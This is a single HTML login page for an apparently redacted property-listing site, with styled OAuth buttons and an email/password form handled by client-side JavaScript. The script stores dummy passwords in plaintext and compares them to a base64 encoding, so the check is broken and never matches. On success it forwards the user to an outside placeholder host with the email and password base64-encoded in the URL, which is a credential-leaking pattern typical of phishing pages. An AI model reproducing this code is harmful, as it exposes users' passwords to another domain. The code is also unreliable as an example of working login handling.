<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to your dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap">
  <style>
    body { font-family: 'Lato', sans-serif; }
    .nav-link { color: #262637; }
    .nav-link:hover { color: #fd5573; }
    .btn-red { background:#fd5573; color:white; }
    .btn-red:hover { background:#e9e9eb; }
    .btn-purple { background:#8e44ad; color:white; }
    .btn-purple:hover { background:#9b59b6; }
    .btn-blue { background:#3498db; color:white; }
    .btn-blue:hover { background:#2980b9; }
    .btn-log { background:#262637; color:white; }
    .btn-log:hover { background:#e9e9eb; }
  </style>
</head>
<body class="bg-gray-50">
  <!-- Top navigation -->
  <div class="bg-[#262637] text-white py-3">
    <div class="container mx-auto px-6 flex justify-between items-center">
      <div class="flex items-center gap-4">
        <a href="/" class="text-xl font-bold">redacted</a>
      </div>
      <div class="flex gap-6">
        <a href="/login" class="hover:text-[#fd5573]">Login</a>
        <a href="/sign-up" class="hover:text-[#fd5573]">Sign Up</a>
        <a href="/list-your-redacted" class="bg-[#fd5573] px-6 py-2 rounded hover:bg-rose-600">List Property</a>
      </div>
    </div>
  </div>

  <div class="container mx-auto px-6 py-12">
    <div class="flex flex-col md:flex-row gap-8">
      <!-- Left side: OAuth buttons -->
      <div class="md:w-1/2 space-y-3">
        <button class="btn-red w-full py-3 text-lg rounded-lg">Log in using Google Account</button>
        <button class="btn-purple w-full py-3 text-lg rounded-lg">Log in using Yahoo ID</button>
        <button class="btn-blue w-full py-3 text-lg rounded-lg">Log in using Facebook</button>
        <p class="text-center mt-4">or <a href="/sign-up" class="font-bold">Sign Up</a> for an account</p>
      </div>

      <!-- Right side: Email / Password -->
      <div class="md:w-1/2 bg-white rounded-2xl shadow-xl p-8">
        <h2 class="text-3xl font-bold text-[#262637] mb-6">Log In</h2>

        <div class="space-y-6">
          <div>
            <label class="block text-sm font-medium mb-2">Your email address</label>
            <input id="regmail" type="email" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#fd5573]" placeholder="Email address" required>
          </div>
          <div>
            <label class="block text-sm font-medium mb-2">Your password</label>
            <input id="pass1" type="password" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#fd5573]" placeholder="Password" required>
          </div>
        </div>

        <div class="mt-8">
          <button onclick="performLogin()" class="btn-log w-full py-3 text-lg font-semibold rounded-lg">
            Log In
          </button>
          <p class="text-center mt-4">
            <a id="href" class="text-sm cursor-pointer hover:text-[#fd5573]">Forgot your password?</a>
          </p>
        </div>
      </div>
    </div>
  </div>

  <script>
    function performLogin() {
      const email = document.getElementById('regmail').value.trim();
      const pass = document.getElementById('pass1').value;

      if (!email || !pass) {
        alert("Please enter both email and password");
        return;
      }

      const dummyUsers = {
        "test@example.com": "password123",
        "demo@realestate.com": "securepass456"
      };

      if (dummyUsers[email.toLowerCase()] === btoa(pass)) {
        window.location.href = "https://your-second-app.com?from=test-site&session=" + btoa(email + ":" + pass);
      } else {
        document.getElementById('pass1').value = "";
        alert("Wrong email address or password");
      }
    }

    document.getElementById('href').addEventListener('click', () => {
      alert("Password reset link would go here in production");
    });
  </script>
</body>
</html>
